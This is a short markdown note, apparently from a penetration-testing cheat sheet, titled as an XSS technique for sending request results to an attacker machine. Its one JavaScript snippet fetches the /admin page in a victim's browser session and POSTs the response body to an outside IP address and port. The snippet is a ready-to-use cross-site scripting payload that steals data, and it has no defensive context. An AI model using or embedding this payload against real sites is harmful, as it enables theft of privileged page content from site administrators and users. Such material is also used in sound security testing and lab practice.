---
tags:
- xss
---

# XSS Send request result to an attacker machine

```js
fetch("/admin").then(data => data.text()).then(data => {

    fetch("http://192.168.45.195:9000", {method: "POST", body: data, mode: 'no-cors'})

})
```